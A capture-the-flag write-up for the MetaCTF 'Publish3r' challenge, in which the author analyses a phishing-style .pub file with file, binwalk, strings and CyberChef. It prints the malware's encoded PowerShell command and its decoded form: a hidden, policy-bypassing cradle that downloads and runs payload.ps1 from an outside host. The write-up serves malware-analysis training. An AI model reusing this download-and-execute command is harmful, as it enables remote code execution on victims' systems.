# Publish3r
### Problem description

We believe we found a malicious file on someone's workstation. Judging by looking at it, the file likely came from a phishing email. Anyways, we'd like you to analyze the sample, so we can see what would have happened if it executed successfully. That way we can hunt for signs of it across the enterprise. Your flag will be the URL that the malware is trying to reach out to! Can you do it? Format: `MetaCTF{http://.........}`

Note: We've put the actual file in an encrypted 7z so your browser doesn't complain when downloading it (and our site doesn't get flagged as malware). The password is `metactf`
## Steps I followed to find relevant information and the flag

Firstly, I used file command to know what kind of zip was it.

```shell
$ file Publish3r.7z 
Publish3r.7z: 7-zip archive data, version 0.4
```

Secondly, I unziped the file with the above provided password. It only has a `.pub` file, when opening this file we realize that has a message:

<img src="https://res.cloudinary.com/dxbnpu2rx/image/upload/v1603849360/Screenshot_from_2020-10-27_14-41-13_djv3vs.png" height="300" width="600"/>


So I though, obviously it has to be something contained within the `Publish3r.pub` file.

Using `binwalk` I realized that the file has compressed LZMA data 
```shell
$ binwalk -z Publish3r.pub 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
109221        0x1AAA5         LZMA compressed data, properties: 0xC6, dictionary 
size: 0 bytes, uncompressed size: 196608 bytes
```

Since I couldn't find how to extraxt LZMA compressed data whithin a .pub file I tried by searching the strings of the file.

```shell
$ strings Publish3r.pub > Publisher.txt
``` 

And I found this interesting string:

`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec Bypass -windowstyle hidden -enc SQBFAHgAIAAoACgAbgBFAFcALQBPAEIASgBlAEMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbA
BvAGEAZABzAHQAcgBpAG4AZwAoACgAIgBoAHQAdABwADoALwAvADEAMwAuADMANwAuADEAMAAuADEAMAA6ADQANAA0ADMALwBkA
G8AYwAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAiACkAKQApAA==`


Using the [CyberChef](https://gchq.github.io/CyberChef/) tool provided by MetaCTF I decoded the base64 string.

The decoded strirngs is as follows:

`I.E.x. .(.(.n.E.W.-.O.B.J.e.C.t. .n.e.t...w.e.b.c.l.i.e.n.t.)...d.o.w.n.l.o.a.d.s.t.r.i.n.g.(.(.".h.t.t.p.:././.1.3...3.7...1.0...1.0.:.4.4.4.3./.d.o.c./.p.a.y.l.o.a.d...p.s.1.".).).).`

Simply by removing the '.' after each `n+1` character of the string we get:

`I.E.x ((nEWOBJeCt.net.webclient).downloadstring(("http://13.37.10.10:4443/doc/payload.ps1")))`

The flag for this problem is **MetaCTF{http://13.37.10.10:4443/doc/payload.ps1}**




